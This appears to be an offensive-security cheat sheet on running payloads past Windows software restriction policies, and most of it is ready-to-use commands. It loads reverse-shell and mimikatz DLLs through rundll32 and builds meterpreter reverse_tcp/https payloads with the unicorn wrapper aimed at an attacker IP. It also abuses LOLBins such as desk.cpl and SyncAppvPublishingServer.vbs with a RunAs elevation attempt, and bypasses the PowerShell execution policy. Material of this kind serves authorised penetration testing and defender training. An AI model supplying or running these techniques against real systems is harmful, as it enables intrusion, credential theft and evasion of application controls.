# Alternative Payloads

## Using DLLs & macros

We can create a DLL containing a Metasploit payload and then run it on the victim system via the rundll32.exe available in all versions of Windows. This is often available, even with SRP enabled, as it is located in C:\Windows and is not restricted by default in many SRP deployments. Scripts and macro payloads are also valuable. Macros especially tend to be allowed for complicated forms and other Office document functionality.

```
C:\> rundll32.exe reverse_shell.dll,Main
```

After we execute the command rundll32.exe CALC.dll,DoesntExist, our DLL will be loaded into memory, and our embedded Metasploit payload will be run through the initialization code. The DoesntExist parameter needs to be included, but it does not have to be a real function exported by the DLL

## Using Payload Wrappers

we can use various open source payload wrappers that add  an extra layer to msfvenom payloads. not much of an FUD payload, but still effective.

{% embed url="https://github.com/trustedsec/unicorn" %}

for example with unicorn tool:

```
unicorn.py windows/meterpreter/reverse_tcp X.X.X.X 443 hta
```

or

```
python unicorn.py windows/meterpreter/reverse_https 192.168.5.5 443 dde
```

## LOLBins

&#x20;Using [LOLBins](https://lolbas-project.github.io/#) we can bypass some protections when executing malicious  DLLs.

```
C:\> rundll32.exe CALC.dll,DoesntExist
C:\> rundll32.exe mimikatz.dll,Main
```

## System DLLs

we can use functions from system DLLs such as CMD screensaver.

```
C:\Windows> copy System32\cmd.exe Temp\cmd.scr
C:\Windows> rundll32.exe desk.cpl,InstallScreenSaver
```

## Multi-level Execution

By using multiple levels of execution, it could be possible to stumble into one that is explicitly allowed or has special privileges. Here we see cmd.exe running cscript.exe, which runs a VBS script included with Windows. This script can be abused to run other things. A great side effect of using this script: it is signed by Microsoft, and therefore often explicitly allowed to run. Then the PowerShell process is started, using a “- Verb RunAs” argument which attempts to re-establish “High Integrity” context, essentially giving an administrative user back their administration rights.

```
cmd.exe /c cscript.exe \windows\system32\SyncAppvPublishingServer.vbs ".;Start-Process rundll32.exe 'shell32.dll,ShellExec_runDLL cmd.exe' -Verb RunAs" 
```

we can do the same with powershell:

```
Powershell.exe -Command Set-ExecutionPolicy RemoteSigned -Scope Process; Powershell.exe -File "path to master script"
```













